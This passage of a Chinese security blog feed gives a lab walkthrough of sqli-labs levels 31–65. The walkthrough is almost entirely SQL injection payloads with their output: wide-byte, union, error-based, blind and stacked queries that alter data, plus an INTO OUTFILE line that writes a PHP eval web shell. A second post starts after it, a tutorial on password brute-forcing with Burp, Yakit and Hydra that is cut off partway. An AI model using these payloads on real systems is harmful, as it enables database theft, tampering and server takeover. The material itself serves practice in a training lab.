1,database(),3–+</p><h5><span id="31">31，“）</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-31/?id=1&id=0">http://192.168.2.55:808/sqli/Less-31/?id=1&amp;id=0</a>“) union select 1,database(),3– -</p><h5><span id="32宽字节注入">32，宽字节注入</span></h5><p>利用mysql使用GBK编码，将两个字符看作一个汉字的特性，消除转义符号””，使单引号成功逃逸出来。</p><p><a href="http://192.168.2.55:808/sqli/Less-32/?id=0%EF%BF%BD">http://192.168.2.55:808/sqli/Less-32/?id=0%df</a>‘  union select 1,database(),3 –+</p><h5><span id="33宽字节转义">33，宽字节转义</span></h5><p>Less33通关方式与Less32一模一样区别在于后台在Less33使用了 addslashes()这个函数对字符串进行转义，Less32手动添加过滤转义</p><p><a href="http://192.168.2.55:808/sqli/Less-33/?id=0%EF%BF%BD">http://192.168.2.55:808/sqli/Less-33/?id=0%df</a>‘ union select 1,database(),3 –+</p><h5><span id="34汉字">34，汉字</span></h5><p>post提交不能使用url编码，但是可以使用十六进制编码绕过，但是需要使用三个字节，最好的办法是是使用汉字(一些汉字是三个字节的就可以将后面的\消耗)</p><p>uname&#x3D;汉’ union select database(),2 – -&amp;passwd&#x3D;2&amp;submit&#x3D;Submit</p><h5><span id="35整型注入表名要16进制转义">35，整型注入,表名要16进制转义</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-35/?id=0">http://192.168.2.55:808/sqli/Less-35/?id=0</a> union select 1,database(),3 – -</p><h5><span id="36宽字节注入">36，宽字节注入</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-36/?id=0%EF%BF%BD">http://192.168.2.55:808/sqli/Less-36/?id=0%df</a>‘ union select 1,database(),3 – -</p><h5><span id="37post的宽字节注入">37，post的宽字节注入</span></h5><p>uname&#x3D;汉’ union select 1,database() #&amp;passwd&#x3D;2&amp;submit&#x3D;Submit</p><h5><span id="38堆叠字符">38，堆叠’字符</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-38/?id=0">http://192.168.2.55:808/sqli/Less-38/?id=0</a>‘  union select 1,database(),3  and ‘1’&#x3D;’1</p><p><a href="http://192.168.2.55:808/sqli/Less-38/?id=1">http://192.168.2.55:808/sqli/Less-38/?id=1</a>‘; insert users(username,password)value(‘777’,’777’)  – -</p><h5><span id="39堆叠数字">39，堆叠数字</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-39/?id=0">http://192.168.2.55:808/sqli/Less-39/?id=0</a> union select 1,database(),3 – -</p><p><a href="http://192.168.2.55:808/sqli/Less-39/?id=1">http://192.168.2.55:808/sqli/Less-39/?id=1</a>; delete  from users where  username&#x3D;’777’   – -</p><h5><span id="40堆叠字符">40，堆叠‘）字符</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-40/?id=0">http://192.168.2.55:808/sqli/Less-40/?id=0</a> ‘) union select 1,database(),3 – -</p><p><a href="http://192.168.2.55:808/sqli/Less-40/?id=01">http://192.168.2.55:808/sqli/Less-40/?id=01</a>‘) ; update users set password&#x3D;’22’  where username&#x3D;’2’ – -</p><h5><span id="41堆叠数字">41，堆叠数字</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-41/?id=0">http://192.168.2.55:808/sqli/Less-41/?id=0</a> union select 1,database(),3 – -</p><p><a href="http://192.168.2.55:808/sqli/Less-41/?id=0">http://192.168.2.55:808/sqli/Less-41/?id=0</a> ;insert users(username,password)value(777,777)  – -</p><h5><span id="42堆叠字符">42，堆叠’字符</span></h5><p>-1’ or updatexml(1,concat(0x7e,database(),0x7e),1)#</p><p>-1’; insert into users(username,password)value(‘888’,’888’)   – -</p><h5><span id="43堆叠字符">43，堆叠’）字符</span></h5><p>login_user&#x3D;2&amp;login_password&#x3D;0’) or updatexml(1,concat(0x7e,database(),0x7e),1)– -&amp;mysubmit&#x3D;Login</p><p><strong>login</strong><em>user&#x3D;2&amp;<strong>login</strong></em><strong>password</strong>&#x3D;0’);<strong>delete</strong> from users where username&#x3D;’888’ – -&amp;mysubmit&#x3D;<strong>Login</strong></p><h5><span id="44布尔盲注">44，布尔盲注，’</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注44.py</p><p>url &#x3D; “<a href="http://192.168.2.55:808/sqli/Less-44/login.php">http://192.168.2.55:808/sqli/Less-44/login.php</a>“</p><p>“login_password”:  “2’ and ascii(substr(database(),{0},1))&gt; {1}– -“.format(i,tmp),</p><h5><span id="45布尔盲注">45，布尔盲注，’）</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注45.py</p><p>url &#x3D; “<a href="http://192.168.2.55:808/sqli/Less-45/login.php">http://192.168.2.55:808/sqli/Less-45/login.php</a>“</p><p>“login_password”:  “2’) and ascii(substr(database(),{0},1))&gt; {1}– -“.format(i,tmp),</p><p><strong>login</strong><em>user&#x3D;2&amp;<strong>login</strong></em><strong>password</strong>&#x3D;2’);insert into users(username,<strong>password</strong>)value(‘666’,’666’)– -&amp;mysubmit&#x3D;<strong>Login</strong></p><h5><span id="46报错数字">46，报错数字</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-46/?sort=1">http://192.168.2.55:808/sqli/Less-46/?sort=1</a> and updatexml(1,concat(0x7e,database(),0x7e),1)–+</p><h5><span id="47报错">47，报错‘</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-47/?sort=1">http://192.168.2.55:808/sqli/Less-47/?sort=1</a> ‘ and updatexml(1,concat(0x7e,database(),0x7e),1)– -</p><h5><span id="48无报错回显且1x3d2也能出数据说明不能用布尔盲注睡眠注入">48，无报错回显且1&#x3D;2也能出数据，说明不能用布尔盲注，睡眠注入</span></h5><p>pycharm\pycharmcode\SQL_py\睡眠注入48.py</p><p>url1&#x3D;”<a href="http://192.168.2.99:808/sqli/Less-48/?sort=1">http://192.168.2.99:808/sqli/Less-48/?sort=1</a>“</p><p>url&#x3D;url1+” and if( ascii(substring(database(),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><h5><span id="49睡眠">49，睡眠‘</span></h5><p><a href="http://192.168.2.99:808/sqli/Less-49/?sort=1">http://192.168.2.99:808/sqli/Less-49/?sort=1</a>‘ and if(1&#x3D;1,sleep(2),0) – -睡眠注入</p><p>pycharm\pycharmcode\SQL_py\睡眠注入49.py</p><p>url1&#x3D;”<a href="http://192.168.2.99:808/sqli/Less-49/?sort=1">http://192.168.2.99:808/sqli/Less-49/?sort=1</a>‘“</p><p>url&#x3D;url1+” and if( ascii(substring(database(),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(2),1)– -“</p><h5><span id="50报错注入">50，报错注入</span></h5><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> and  (extractvalue(1,concat(0x7e,(select user()),0x7e))) – -</p><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> and  (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> and  (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()),0x7e))) – -</p><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> and  (extractvalue(1,concat(0x7e,(select group_concat(id,”<del>“,username,”</del>“,password) from users),0x7e))) – -</p><p>堆叠注入：webshell</p><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> and (extractvalue(1,concat(0x7e,(select @@datadir),0x7e)))– -</p><p>C:\phpStudy_64\phpstudy_pro\Ext</p><p><a href="http://192.168.2.99:808/sqli/Less-50/?sort=1">http://192.168.2.99:808/sqli/Less-50/?sort=1</a> ; select ‘<?php eval($_REQUEST["ant"]);  ?>‘ into outfile ‘C:\phpStudy_64\sqli\WWW\shell.php’ – -</p><p>蚁剑连接</p><h5><span id="51报错">51，报错</span></h5><p><a href="http://192.168.2.99:808/sqli/Less-51/?sort=1">http://192.168.2.99:808/sqli/Less-51/?sort=1</a>‘ and  (extractvalue(1,concat(0x7e,(select database()),0x7e))) – -</p><p>堆叠</p><p><a href="http://192.168.2.99:808/sqli/Less-51/?sort=1">http://192.168.2.99:808/sqli/Less-51/?sort=1</a>‘ ; delete from users where username&#x3D;’777’ – -</p><h5><span id="52睡眠注入">52，睡眠注入</span></h5><p>堆叠</p><p><a href="http://192.168.2.99:808/sqli/Less-52/?sort=1">http://192.168.2.99:808/sqli/Less-52/?sort=1</a> ;delete from  users where username&#x3D;’666’ – -</p><h5><span id="53睡眠注入">53，睡眠注入</span></h5><p><a href="http://192.168.2.99:808/sqli/Less-53/?sort=1">http://192.168.2.99:808/sqli/Less-53/?sort=1</a> ‘ and if(1&#x3D;1,sleep(2),2)– -</p><p>堆叠</p><p><a href="http://192.168.2.99:808/sqli/Less-53/?sort=1">http://192.168.2.99:808/sqli/Less-53/?sort=1</a> ‘ ; insert into users(username,password)value(‘666’,’666’)– -</p><h5><span id="5410次机会">54，10次机会，‘</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-54/?id=-1">http://192.168.2.99:8081/sqli/Less-54/?id=-1</a>‘ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p><p>4583u0j0e6</p><p><a href="http://192.168.2.99:8081/sqli/Less-54/?id=-1">http://192.168.2.99:8081/sqli/Less-54/?id=-1</a>‘ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’4583u0j0e6’;– -</p><p>id,sessid,secret_BKWC,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-54/?id=-1">http://192.168.2.99:8081/sqli/Less-54/?id=-1</a>‘ union select 1,group_concat(id,”<del>“,sessid,”</del>“,secret_BKWC,”~”,tryy),3 from 4583u0j0e6; – -</p><p>1<del>dc7242155f0dd877e21dff7ccd92053e</del>j8THEP1TfVpXKpdIQ2XKjkuj~4</p><h5><span id="55">55，）</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-55/?id=0">http://192.168.2.99:8081/sqli/Less-55/?id=0</a>) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p><p>sbbdpdw45s</p><p><a href="http://192.168.2.99:8081/sqli/Less-55/?id=0">http://192.168.2.99:8081/sqli/Less-55/?id=0</a>) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’sbbdpdw45s’;– -</p><p>id,sessid,secret_2HIV,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-55/?id=0">http://192.168.2.99:8081/sqli/Less-55/?id=0</a>) union select 1,group_concat(id,”<del>“,sessid,”</del>“,secret_2HIV,”~”,tryy),3 from sbbdpdw45s; – -</p><p>1<del>08fdf424f2ba3c4e61dc1bc8e00e8915</del>oI7bLrsFs1ANJye03YnByIxQ~10</p><h5><span id="56">56，’）</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-56/?id=0">http://192.168.2.99:8081/sqli/Less-56/?id=0</a>‘) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p><p>1jtx95ougn</p><p><a href="http://192.168.2.99:8081/sqli/Less-56/?id=0">http://192.168.2.99:8081/sqli/Less-56/?id=0</a>‘) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’1jtx95ougn’;– -</p><p>id,sessid,secret_4EPL,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-56/?id=0">http://192.168.2.99:8081/sqli/Less-56/?id=0</a>‘) union select 1,group_concat(id,”<del>“,sessid,”</del>“,secret_4EPL,”~”,tryy),3 from 1jtx95ougn; – -</p><p>1<del>7e185cc0ad0a719c730af5354d7142c1</del>s4zHHSR3YKewOLIStQ4hsNQ4~14</p><h5><span id="57">57，“</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-57/?id=0">http://192.168.2.99:8081/sqli/Less-57/?id=0</a>“   union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p><p>nbdx8qr5nj</p><p><a href="http://192.168.2.99:8081/sqli/Less-57/?id=0">http://192.168.2.99:8081/sqli/Less-57/?id=0</a>“   union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’nbdx8qr5nj’;– -</p><p>id,sessid,secret_CN21,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-57/?id=0">http://192.168.2.99:8081/sqli/Less-57/?id=0</a>“   union select 1,group_concat(id,”<del>“,sessid,”</del>“,secret_CN21,”~”,tryy),3 from nbdx8qr5nj; – -</p><p>1<del>850a7c43f3898343d411b265ee36f95b</del>R5ccZGpi65RUEEGXbLD8ycgQ~8</p><h5><span id="585次机会报错注入">58，5次机会，报错注入，‘</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-58/?id=0">http://192.168.2.99:8081/sqli/Less-58/?id=0</a>‘  or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p>le2466per4</p><p><a href="http://192.168.2.99:8081/sqli/Less-58/?id=0">http://192.168.2.99:8081/sqli/Less-58/?id=0</a>‘  or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’deklrkqg3s’),0x7e))) – -</p><p>id,sessid,secret_Y5BQ,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-58/?id=0">http://192.168.2.99:8081/sqli/Less-58/?id=0</a>‘  or (extractvalue(1,concat(0x7e,(select group_concat(secret_Y5BQ) from le2466per4),0x7e))) – -</p><p>70SS6T7OiWiJcuLmhRcaHc7S</p><h5><span id="59数字型">59，数字型</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-59/?id=0">http://192.168.2.99:8081/sqli/Less-59/?id=0</a> or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p>aovtgmxolk</p><p><a href="http://192.168.2.99:8081/sqli/Less-59/?id=0">http://192.168.2.99:8081/sqli/Less-59/?id=0</a> or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’aovtgmxolk’),0x7e))) – -</p><p>id,sessid,secret_0EJ4,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-59/?id=0">http://192.168.2.99:8081/sqli/Less-59/?id=0</a> or (extractvalue(1,concat(0x7e,(select group_concat(secret_0EJ4) from aovtgmxolk),0x7e))) – -</p><p>rZu2tyGoAefc72wnG690xkMG</p><h5><span id="60">60，“）</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-60/?id=0">http://192.168.2.99:8081/sqli/Less-60/?id=0</a>“) or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p>6sc0vop2bp</p><p><a href="http://192.168.2.99:8081/sqli/Less-60/?id=0">http://192.168.2.99:8081/sqli/Less-60/?id=0</a>“) or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’6sc0vop2bp’),0x7e))) – -</p><p>id,sessid,secret_Q77U,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-60/?id=0">http://192.168.2.99:8081/sqli/Less-60/?id=0</a>“) or (extractvalue(1,concat(0x7e,(select group_concat(secret_Q77U) from 6sc0vop2bp),0x7e))) – -</p><p>fI6JFsiOHrzoezjU5x1KqfLY</p><h5><span id="61">61，’))</span></h5><p><a href="http://192.168.2.99:8081/sqli/Less-61/?id=0">http://192.168.2.99:8081/sqli/Less-61/?id=0</a>‘)) or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p>4ppo19urah</p><p><a href="http://192.168.2.99:8081/sqli/Less-61/?id=0">http://192.168.2.99:8081/sqli/Less-61/?id=0</a>‘)) or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’4ppo19urah’),0x7e))) – -</p><p>id,sessid,secret_4ZZ0,tryy</p><p><a href="http://192.168.2.99:8081/sqli/Less-61/?id=0">http://192.168.2.99:8081/sqli/Less-61/?id=0</a>‘)) or (extractvalue(1,concat(0x7e,(select group_concat(secret_4ZZ0) from 4ppo19urah),0x7e))) – -</p><p>OobEQ7DhhcsAwdKzCKqOlNSn</p><h5><span id="62布尔盲注">62，布尔盲注，’）</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注62.py</p><p>url &#x3D; “<a href="http://192.168.2.99:8081/sqli/Less-62/?id=1">http://192.168.2.99:8081/sqli/Less-62/?id=1</a>‘) “</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>23w0rnyb8w</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’23w0rnyb8w’and table_schema&#x3D;database() limit 2,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>secret_T93K</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(secret_T93K) from 23w0rnyb8w),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>TbW1UEpYS7wTom3iuioLlQNB</p><h5><span id="63布尔盲注">63，布尔盲注，‘</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注63.py</p><p>url &#x3D; “<a href="http://192.168.2.99:8081/sqli/Less-63/?id=1">http://192.168.2.99:8081/sqli/Less-63/?id=1</a>‘ “</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>c45jnnrl1k</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’c45jnnrl1k’and table_schema&#x3D;database() limit 2,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>secret_HNRD</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(secret_HNRD) from c45jnnrl1k),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>Ge3Vlr7qJyAQphSvErtlL5op</p><h5><span id="64布尔盲注">64，布尔盲注，))</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注64.py</p><p>url &#x3D; “<a href="http://192.168.2.99:8081/sqli/Less-64/?id=1">http://192.168.2.99:8081/sqli/Less-64/?id=1</a>)) “</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>wfi2cu5m54</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’wfi2cu5m54’and table_schema&#x3D;database() limit 2,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>secret_5L84</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(secret_5L84) from wfi2cu5m54),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>O7Mn6n8XXu6pZglURaQSt8uB</p><h5><span id="65布尔盲注">65,布尔盲注，“）</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注65.py</p><p>url &#x3D; ‘<a href="http://192.168.2.99:8081/sqli/Less-65/?id=1">http://192.168.2.99:8081/sqli/Less-65/?id=1</a>“) ‘</p><p>paramsGet &#x3D; url+ ‘&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),{0},1))&gt;{1}–+’.format(i,tmp)</p><p>mylxhrrvqc</p><p>paramsGet &#x3D; url+ ‘&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;”mylxhrrvqc”and table_schema&#x3D;database() limit 2,1),{0},1))&gt;{1}–+’.format(i,tmp)</p><p>secret_P70U</p><p>paramsGet &#x3D; url+ ‘&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(secret_P70U) from mylxhrrvqc),{0},1))&gt;{1}–+’.format(i,tmp)</p><p>vY86QMIGgDOHf7FpYUBcTefF</p><br><br><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;sqli关卡&quot;&gt;sqli关卡：&lt;/span&gt;&lt;/h4&gt;&lt;h5&gt;&lt;span id=&quot;get请求&quot;&gt;get请求&lt;/span&gt;&lt;/h5&gt;&lt;h5&gt;&lt;span id=&quot;1字符型&quot;&gt;1，字符型&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;a href=&quot;http://192.1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十五，密码爆破</title>
    <link href="http://example.com/2024/01/07/%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2024/01/07/%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2024-01-07T11:10:16.000Z</published>
    <updated>2024-01-07T12:32:30.216Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="目录">目录:</span></h4><p>&emsp;<strong>环境搭建</strong><br>&emsp;&emsp;<strong>1，PHPstudy创建一个新网站</strong><br>&emsp;&emsp;<strong>2，下载靶场文件</strong><br>&emsp;&emsp;<strong>3，修改配置文件</strong><br>&emsp;&emsp;<strong>4，打开网页并进行初始化</strong><br>&emsp;&emsp;<strong>5，靶场搭建成功</strong><br>&emsp;<strong>burp密码爆破</strong><br>&emsp;&emsp;<strong>1，拦截靶场</strong><br>&emsp;&emsp;<strong>2，burp中开启拦截</strong><br>&emsp;&emsp;<strong>3，在网页中随便输入账号密码，并点击Login</strong><br>&emsp;&emsp;<strong>4，burp拦截发送的数据包，并右键发送到intruder中</strong><br>&emsp;&emsp;<strong>5，设置修改位置</strong><br>&emsp;&emsp;<strong>6，设置payload</strong><br>&emsp;&emsp;<strong>7，开始攻击</strong><br>&emsp;<strong>Yakit密码爆破</strong><br>&emsp;&emsp;<strong>1，拦截靶场</strong><br>&emsp;&emsp;<strong>2，在网页中随便输入账号密码并输入正确的验证码，点击Login</strong></p><p>&emsp;&emsp;<strong>3，在Yakit中将劫持到的数据包右键发送到webfuzzer</strong><br>&emsp;&emsp;<strong>4，设置字典</strong><br>&emsp;&emsp;<strong>5，发送请求</strong><br>&emsp;<strong>Hydra密码爆破</strong><br>&emsp;&emsp;<strong>1，介绍</strong><br>&emsp;&emsp;<strong>2，参数</strong><br>&emsp;&emsp;<strong>3，查看参数版本等信息</strong><br>&emsp;&emsp;<strong>4，爆破SSH</strong><br>&emsp;&emsp;<strong>5，使用字典爆破</strong><br>&emsp;&emsp;<strong>6，Hydra爆破常见服务</strong></p><h4><span id="环境搭建">环境搭建</span></h4><h5><span id="1phpstudy创建一个新网站">1，PHPstudy创建一个新网站</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071918751.png" alt="image-20240107191806298"></p><h5><span id="2下载靶场文件">2，下载靶场文件</span></h5><p>在网站的根目录下载pikachu-master.zip并解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071919938.png" alt="image-20240107191953403"></p><h5><span id="3修改配置文件">3，修改配置文件</span></h5><p>修改C:\phpStudy_64\pikachu\WWW\pikachu-master\pikachu-master\inc下的config.inc.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071922485.png" alt="image-20240107192212005"></p><p>修改为自己数据库的账号和密码</p><h5><span id="4打开网页并进行初始化">4，打开网页并进行初始化</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071923262.png" alt="image-20240107192354783"></p><h5><span id="5靶场搭建成功">5，靶场搭建成功</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071925050.png" alt="image-20240107192520712"></p><br><br><h4><span id="burp密码爆破">burp密码爆破</span></h4><h5><span id="1拦截靶场">1，拦截靶场</span></h5><p>打开burp—-&gt;代理—-&gt;打开内嵌浏览器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071933153.png" alt="image-20240107193338933"></p><p>复制网址到内嵌浏览器中打开</p><h5><span id="2burp中开启拦截">2，burp中开启拦截</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071935984.png" alt="image-20240107193525182"></p><h5><span id="3在网页中随便输入账号密码并点击login">3，在网页中随便输入账号密码，并点击Login</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071937960.png" alt="image-20240107193748253"></p><h5><span id="4burp拦截发送的数据包并右键发送到intruder中">4，burp拦截发送的数据包，并右键发送到intruder中</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071937678.png" alt="image-20240107193732767"></p><h5><span id="5设置修改位置">5，设置修改位置</span></h5><p>先点击清除payload位置</p><p>拉住输入的用户名并点击添加payload位置</p><p>拉住输入的密码并点击添加payload位置</p><p>攻击类型选择多个payload集合</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071941985.png" alt="image-20240107194127591"></p><br><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071942893.png" alt="image-20240107194243185"></p><h5><span id="6设置payload">6，设置payload</span></h5><p>点击payload</p><p>payload集选择1也就是我们添加的第一个—-用户名</p><p>在清单中加入可用的用户名，也可以导入文件或使用burp自带的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071944688.png" alt="image-20240107194448573"></p><p>payload集选择2也就是我们添加的第二个—-密码</p><p>在清单中加入可用的密码，也可以导入文件或使用burp自带的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071947599.png" alt="image-20240107194748639"></p><h5><span id="7开始攻击">7，开始攻击</span></h5><p>点击开始攻击等待到弹窗底部显示已完成即可</p><p>点击长度找出响应包大小不同的数据包</p><p>点击Response—-&gt;页面渲染可以看到Login success的字样显示登录成功</p><p>在上方可以看到用户名为admin,密码为123456</p><p>爆破成功！</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071950110.png" alt="image-20240107195015431"></p><br><br><h4><span id="yakit密码爆破">Yakit密码爆破</span></h4><h5><span id="1拦截靶场">1，拦截靶场</span></h5><p>点击MITM—-&gt;免配置启动—-&gt;免配置启动—-&gt;打开chrome浏览器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071957170.png" alt="image-20240107195742939"></p><p>复制靶场的网址到chrome浏览器中打开,并点击手动劫持</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071959934.png" alt="image-20240107195936801"></p><h5><span id="2在网页中随便输入账号密码并输入正确的验证码点击login">2，在网页中随便输入账号密码并输入正确的验证码，点击Login</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072001542.png" alt="image-20240107200111421"></p><h5><span id="3在yakit中将劫持到的数据包右键发送到webfuzzer">3，在Yakit中将劫持到的数据包右键发送到webfuzzer</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072004622.png" alt="image-20240107200427562"></p><h5><span id="4设置字典">4，设置字典</span></h5><p>在webfuzzer中将填入的账号密码删除并右键插入模糊测试字典标签，并设置对应的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072006089.png" alt="image-20240107200605762"></p><br><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072008065.png" alt="image-20240107200758880"></p><h5><span id="5发送请求">5，发送请求</span></h5><p>点击发送请求，等待至右侧的成功250完成</p><p>点击响应大小找出响应包大小不同的数据包</p><p>点击响应—-&gt;渲染可以看到Login success的字样显示登录成功</p><p>在上方可以看到用户名为admin,密码为123456</p><p>爆破成功！</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072011068.png" alt="image-20240107201132935"></p><br><br><h4><span id="hydra密码爆破">Hydra密码爆破</span></h4><h5><span id="1介绍">1，介绍</span></h5><p>Hydra也叫九头蛇，是一款开源的暴力PJ工具，集成在kali当中。</p><h5><span id="2参数">2，参数</span></h5><ul><li><p>-l 指定用户名</p></li><li><p>-p 指定密码</p></li><li><p>-L 指定用户名字典</p></li><li><p>-P 指定密码字典</p></li><li><p>-C 指定所用格式为“user:password”的字典文件</p></li><li><p>-e</p><ul><li>n null，表示尝试空密码</li><li>s same，把用户名本身当做密码进行尝试</li><li>r 